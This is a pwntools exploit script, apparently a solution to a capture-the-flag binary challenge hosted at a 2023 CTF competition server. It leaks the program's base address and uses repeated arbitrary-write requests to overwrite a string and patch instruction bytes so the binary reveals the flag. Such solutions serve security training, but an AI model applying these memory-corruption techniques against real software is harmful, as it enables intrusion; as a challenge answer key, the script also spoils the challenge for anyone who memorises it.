#!/usr/bin/python3

from pwn import *

exe = ELF('chal', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('wfw2.2023.ctfcompetition.com', 1337)
else:
        p = process(exe.path)

# GDB()
offset_somehow = 0x20d5


p.recvlines(3)
exe.address = int("0x" + p.recv(12).decode(), 16)
info("exe base: " + hex(exe.address))

addr_mov_edi = exe.address + 0x143b
addr_call_exit = exe.address + 0x1440

# ghi đè chuỗi "Somehow" thành flag
p.sendline(hex(exe.address + 0x20d5) + " " + str(100))
sleep(1)
# ghi đè mov edi
p.sendline((hex(addr_mov_edi + 0)) + " " + str(1))
sleep(1)
p.sendline((hex(addr_mov_edi + 1)) + " " + str(1))
sleep(1)
p.sendline((hex(addr_mov_edi + 2)) + " " + str(1))
sleep(1)
p.sendline((hex(addr_mov_edi + 3)) + " " + str(2))
sleep(1)

# ghi đè call exit

p.sendline((hex(addr_call_exit + 0)) + " " + str(1))
sleep(1)
p.sendline((hex(addr_call_exit + 1)) + " " + str(1))
sleep(1)
p.sendline((hex(addr_call_exit + 2)) + " " + str(1))
sleep(1)
p.sendline((hex(addr_call_exit + 3)) + " " + str(2))

sl("a") #exit

p.interactive()
